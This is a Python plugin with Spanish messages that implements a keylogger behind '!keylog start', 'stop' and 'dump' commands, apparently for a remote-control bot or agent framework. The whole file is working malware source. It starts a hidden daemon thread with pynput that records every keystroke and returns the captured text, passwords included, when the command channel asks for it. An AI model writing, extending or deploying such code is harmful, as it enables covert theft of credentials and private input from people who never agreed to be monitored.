"""
Plugin !keylog — captura keystrokes en un hilo de background.
!keylog start  → inicia captura
!keylog stop   → detiene y devuelve todo el buffer
!keylog dump   → devuelve buffer sin detener
"""

import threading

_buffer: list[str] = []
_listener = None
_lock = threading.Lock()


def _on_press(key):
    try:
        char = key.char or ""
    except AttributeError:
        char = f"[{key.name}]"
    with _lock:
        _buffer.append(char)


def _start_listener():
    global _listener
    from pynput import keyboard
    _listener = keyboard.Listener(on_press=_on_press)
    _listener.daemon = True
    _listener.start()


def run(args: str) -> tuple[int, str, str]:
    global _listener
    cmd = args.strip().lower()

    if cmd == "start":
        if _listener and _listener.is_alive():
            return 0, "Keylogger ya activo", ""
        try:
            _start_listener()
            return 0, "Keylogger iniciado — usa !keylog dump para ver capturas", ""
        except ImportError:
            return 1, "", "pynput no instalado: pip install pynput"
        except Exception as exc:
            return 1, "", f"Error al iniciar keylogger: {exc}"

    if cmd == "stop":
        if _listener:
            _listener.stop()
            _listener = None
        with _lock:
            captured = "".join(_buffer)
            _buffer.clear()
        return 0, f"Keylogger detenido.\n\n--- CAPTURADO ---\n{captured or '(vacío)'}", ""

    if cmd == "dump":
        with _lock:
            captured = "".join(_buffer)
        return 0, f"--- BUFFER ACTUAL ---\n{captured or '(vacío)'}", ""

    return 1, "", "Uso: !keylog start | stop | dump"
